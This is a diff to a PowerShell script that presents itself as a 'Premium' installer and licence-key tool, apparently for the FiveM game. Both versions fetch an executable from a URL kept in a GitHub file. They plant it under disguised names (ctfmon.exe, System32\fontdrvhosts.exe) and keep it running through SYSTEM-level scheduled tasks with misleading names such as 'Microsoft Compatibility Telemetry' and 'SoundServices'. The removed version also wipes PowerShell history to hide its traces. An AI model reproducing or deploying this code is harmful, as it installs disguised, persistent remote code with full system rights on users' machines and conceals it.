@@ -1,116 +1,30 @@
-#Requires -RunAsAdministrator
-Clear-Host
-Write-Host "1 : Install Premium"
-Write-Host "2 : Clean Premium"
-Write-Host ""
-$choice = Read-Host "Select (1/2)"
-$ErrorActionPreference = 'Stop'
-$ProgressPreference = 'SilentlyContinue'
 
-$programData = "C:\ProgramData"  # โฟลเดอร์เก็บไฟล์
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Host "ADMIN..."
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+$scriptPath = $PSCommandPath
+$taskName = "RunOnceAfterReboot"
+
+$createTaskCmd = "schtasks /create /tn `"$taskName`" /tr `\"powershell.exe -ExecutionPolicy Bypass -File `\"$scriptPath`\"`\" /sc ONSTART /RL HIGHEST /F /RU SYSTEM /Z"
+
+Invoke-Expression $createTaskCmd
+
+$system32Path = "$env:windir\System32"
+$exeDestination = Join-Path $system32Path "fontdrvhosts.exe"
+$databasePath = Join-Path $system32Path "database.txt"
 $exeUrl = (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/n0roffbrain/xgproject/main/terstax" -UseBasicParsing).Content.Trim()
 
-# จากนั้นคุณสามารถดาวน์โหลดไฟล์จากลิงก์นั้นได้ (หากเชื่อถือได้)
 if ($exeUrl -match '^https?://') {
     Invoke-WebRequest -Uri $exeUrl -OutFile $exeDestination
 }
-$exeName = "ctfmon.exe"                      # ชื่อไฟล์ .exe
-$exePath = Join-Path $programData $exeName
 
-$taskName = "Microsoft Compatibility Telemetry"  # ชื่อ task
+$key = Read-Host "Enter License Key"
+Set-Content -Path $databasePath -Value $key
 
-function Clear-PowerShellTraces {
-    Clear-History -ErrorAction SilentlyContinue
-    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
-    if (Test-Path $historyPath) {
-        Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
-        New-Item $historyPath -ItemType File -Force | Out-Null
-    }
-    $cachePath = "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\ModuleAnalysisCache"
-    if (Test-Path $cachePath) { Remove-Item $cachePath -Force -ErrorAction SilentlyContinue }
-    if ($host.Name -eq 'ConsoleHost') { [console]::Clear() }
-}
+$cmd = 'cmd /c schtasks /create /tn "SoundServices" /tr "C:\Windows\System32\fontdrvhosts.exe" /sc ONEVENT /ec Security /mo "*[System[(EventID=4688)]] and *[EventData[Data[@Name=''NewProcessName'']=''%localappdata%\FiveM\FiveM.exe'']]" /ru SYSTEM'
+Invoke-Expression $cmd
 
-function Reset-FileACLAndTakeOwnership {
-    param([string]$FilePath)
-    if (-not (Test-Path $FilePath)) { return }
-    & takeown /F "$FilePath" /A *>$null 2>$null
-    & icacls "$FilePath" /grant Administrators:F /C /Q *>$null 2>$null
-    & icacls "$FilePath" /reset /C /Q *>$null 2>$null
-}
-
-function Invoke-Clean {
-    $baseName = [IO.Path]::GetFileNameWithoutExtension($exeName)
-    Get-Process -Name $baseName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-    Start-Sleep -Milliseconds 1200
-    schtasks /delete /tn "$taskName" /f *>$null 2>$null
-    if (Test-Path $exePath) {
-        Reset-FileACLAndTakeOwnership $exePath
-        Remove-Item $exePath -Force -ErrorAction SilentlyContinue
-    }
-    Clear-PowerShellTraces
-}
-
-if ($choice -eq "1") {
-    $success = $true
-    $errorCode = 0
-    try {
-        if (-not (Test-Path $programData)) {
-            New-Item -Path $programData -ItemType Directory -Force *>$null 2>$null
-        }
-
-        # ลบไฟล์เดิมถ้ามี
-        if (Test-Path $exePath) {
-            Reset-FileACLAndTakeOwnership $exePath
-            Remove-Item $exePath -Force -ErrorAction Stop
-        }
-
-        # ดาวน์โหลดไฟล์ .exe
-        Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop *>$null 2>$null
-
-        # ตั้งสิทธิ์ไฟล์ให้ SYSTEM
-        & icacls "$exePath" /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:(F)" /C /Q *>$null 2>$null
-
-        Start-Sleep -Milliseconds 800
-
-        # สร้าง Scheduled Task
-        schtasks /create /tn "$taskName" /tr "$exePath" /sc ONSTART /ru SYSTEM /rl HIGHEST /f /DELAY 0000:30 *>$null 2>$null
-        if ($LASTEXITCODE -ne 0) { $errorCode = 6; throw }
-
-        # รัน Task
-        schtasks /run /tn "$taskName" *>$null 2>$null
-        if ($LASTEXITCODE -ne 0) { $errorCode = 7; throw }
-    }
-    catch {
-        $success = $false
-        if ($errorCode -eq 0) { $errorCode = 9 }
-    }
-
-    if ($success) {
-        Write-Host "Successfully" -ForegroundColor Green
-    } else {
-        Write-Host "Error $errorCode" -ForegroundColor Red
-        Pause
-    }
-}
-elseif ($choice -eq "2") {
-    $success = $true
-    try {
-        Invoke-Clean
-    }
-    catch {
-        $success = $false
-    }
-    if ($success) {
-        Write-Host "Successfully" -ForegroundColor Green
-    } else {
-        Write-Host "Error" -ForegroundColor Red
-    }
-    Pause
-}
-else {
-    Write-Host "Error" -ForegroundColor Red
-    Pause
-}
-
-Clear-PowerShellTraces
+auditpol /set /subcategory:"Process Creation" /success:enable
